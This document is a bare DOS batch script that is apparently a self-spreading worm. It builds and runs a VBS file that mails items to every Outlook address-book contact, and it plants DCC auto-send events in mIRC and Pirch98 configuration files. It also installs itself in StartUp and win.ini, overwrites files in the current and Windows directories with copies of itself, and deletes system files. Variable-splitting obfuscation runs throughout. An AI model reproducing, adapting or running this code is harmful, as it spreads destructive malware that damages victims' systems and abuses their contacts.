@echo off
ctty nul
Set MyS=%0
copy %MyS% fgd.bat
copy fgd.bat C:\
copy fgd.bat C:\eeoad.vbs
echo Dim x > C:\eeoad.vbs
set VBSwayA=resume
echo.on error %VBSwayA% next >> C:\eeoad.vbs
set VBSwayA=
echo Set fso =" Scripting.FileSystem.Object" >> C:\eeoad.vbs
echo Set so=CreateObject(fso) >> C:\eeoad.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\eeoad.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\eeoad.vbs
set VBSwayD=out
echo Set mapi = %VBSwayD%.GetNameSpace("MAPI") >> C:\eeoad.vbs
set VBSwayD=
set VBSwayN=Lists
echo Set a = mapi.Address%VBSwayN%(1) >> C:\eeoad.vbs
set VBSwayN=
echo Set ae=a.AddressEntries >> C:\eeoad.vbs
echo For x=1 To ae.Count >> C:\eeoad.vbs
echo Set ci=ol.CreateItem(0) >> C:\eeoad.vbs
echo Set Mail=ci >> C:\eeoad.vbs
set VBSwayC=Name
echo Mail.to=ol.Get%VBSwayC%Space("MAPI").AddressLists(1).AddressEntries(x) >> C:\eeoad.vbs
set VBSwayC=
set VBSwayK=Mail
echo %VBSwayK%.Subject="" >> C:\eeoad.vbs
set VBSwayK=
echo Mail.Body="" >> C:\eeoad.vbs
set VBSwayM=Attachments
echo Mail.%VBSwayM%.Add("C:\") >> C:\eeoad.vbs
set VBSwayM=
echo Mail.Send >> C:\eeoad.vbs
echo Next >> C:\eeoad.vbs
echo ol.Quit >> C:\eeoad.vbs
cscript C:\eeoad.vbs
del C:\eeoad.vbs
del C:\
md C:\pro
copy fgd.bat C:\pro\
if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini
if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini
if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini
set ircc=send
set spp=dcc %ircc% $nick C:\pro\echo [script] > %mIRC%
echo n0=on 1:join:*.*: { if ( $nick !=$me ) /%spp% } >>%mIRC%
if exist C:\pirch98\events.ini goto pir
goto pirend
:pir
copy fgd.bat %WinDir%\
set pif=Lev
echo [%pif%els] > C:\Pirch98\events.ini
echo Enabled=1 >> C:\Pirch98\events.ini
echo Count=6 >> C:\Pirch98\events.ini
set pii=Unknows
echo Level1=000-%pii% >> C:\Pirch98\events.ini
echo 000-UnknowsEnabled=1 >> C:\Pirch98\events.ini
set pik=evel2
echo L%pik%=100-Level 100 >> C:\Pirch98\events.ini
set pil=En
echo 100-Level 100%pil%abled=1 >> C:\Pirch98\events.ini
echo Level3=200-Level 200 >> C:\Pirch98\events.ini
echo 200-Level 200Enabled=1 >> C:\Pirch98\events.ini
echo Level4=300-Level 300 >> C:\Pirch98\events.ini
echo 300-Level 300Enabled=1 >> C:\Pirch98\events.ini
echo Level5=400-Level 400 >> C:\Pirch98\events.ini
echo 400-Level 400Enabled=1 >> C:\Pirch98\events.ini
set pis=Level6
echo L%pis%=500-Level 500 >> C:\Pirch98\events.ini
echo 500-Level 500Enabled=1 >> C:\Pirch98\events.ini
echo [000-Unknowns] >> C:\Pirch98\events.ini
echo User1=*!*@* >> C:\Pirch98\events.ini
set pid=ON JOIN
echo Events1= %pid%:#: /dcc send $nick %WinDir%\ >> C:\Pirch98\events.ini
echo EventCount=1 >> C:\Pirch98\events.ini
echo [100-Level 100] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [200-Level 200] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [300-Level 300] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [400-Level 400] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [500-Level 500] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
:pirend
copy fgd.bat C:\pkelo.bat
copy C:\pkelo.bat %windir%\startm~1\progra~1\autost~1\*.bat
del C:\pkelo.bat
copy fgd.bat %windir%\Start Menu\Programs\StartUp\xpnjr.bat
md C:\suPs
copy fgd.bat C:\suPs\qgrmx.bat
subst L: C:\suPs
for %%v in (*.*) do copy fgd.bat C:\matwc.bat
for %%v in (*.*) do copy C:\matwc.bat %%v
for %%v in (*.*) do ren *.* *.bat
del C:\matwc.bat
ren %WinDir%\*.bat *.ifk
copy fgd.bat C:\xzzyb.bat
for %%w in (%windir%\*.ifk) do copy C:\xzzyb.bat %%w
ren %windir%\*.ifk *.bat
del C:\xzzyb.bat
copy fgd.bat %WinDir%\system\WINI.bat
echo [windows] >funny.bat
set inib=system
echo load=%windir%\%inib%\WINI.bat >>funny.bat
echo run=%windir%\system\WINI.bat >>funny.bat
set inid=Port
echo Null%inid%=None >>funny.bat
set inie=funny
copy %inie%.bat %windir%\dd.ini
del %windir%\win.ini
set inig=unny
del f%inig%.bat
set inih=dd.in
ren %windir%\%inih%i win.ini
copy fgd.bat %windir%\Desktop\*.bat
command /f /c copy fgd.bat A:\
@del fgd.bat
ctty CON